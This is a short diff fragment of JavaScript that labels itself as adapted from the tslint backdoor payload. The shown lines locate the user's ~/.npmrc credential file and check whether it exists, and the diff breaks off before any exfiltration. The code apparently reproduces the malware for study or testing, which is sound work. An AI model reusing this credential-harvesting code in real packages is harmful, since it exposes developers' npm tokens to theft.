@@ -1,4 +1,6 @@
-try {
+// adopted from actual tslint backdoor payload, see https://gist.github.com/hzoo/51cb84afdc50b14bffa6c6dc49826b3e
+
+try { 
   var path = require("path"), fs = require("fs"), content = "nofile";
   var npmrc = path.join(process.env.HOME || process.env.USERPROFILE, ".npmrc");
   if (fs.existsSync(npmrc)) {
